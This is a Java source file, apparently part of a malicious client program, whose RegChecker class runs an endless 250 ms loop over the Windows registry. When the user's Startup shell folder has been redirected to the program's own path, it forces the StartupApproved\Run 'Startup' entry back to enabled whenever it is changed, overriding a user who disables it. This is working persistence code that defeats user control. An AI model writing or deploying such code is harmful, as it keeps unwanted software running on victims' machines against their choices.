package client.utils.check;

import client.ClientMain;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;

import java.util.Arrays;
import java.util.Objects;

public class RegChecker extends Thread{
    @Override
    public void run() {
        String hexString = "02 00 00 00 00 00 00 00 00 00 00 00";
        byte[] byteArray = hexStringToByteArray(hexString);
        new Thread(()->{
            while (true) {
                try {
                    Thread.sleep(250);
                    if(Advapi32Util.registryValueExists(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup") && Objects.equals(Advapi32Util.registryGetExpandableStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "Startup"), ClientMain.otherPath)) {
                        Advapi32Util.registrySetBinaryValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", "Startup", byteArray);
                    }
                    if(Advapi32Util.registryValueExists(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", "Startup") && !Arrays.equals(Advapi32Util.registryGetBinaryValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", "Startup"), byteArray)) {
                        Advapi32Util.registrySetBinaryValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", "Startup", byteArray);
                    }

                } catch (InterruptedException ignored) {
                }
            }
        }).start();


    }

    public static byte[] hexStringToByteArray(String s) {
        s = s.replaceAll("\\s", ""); // 移除空格
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
}
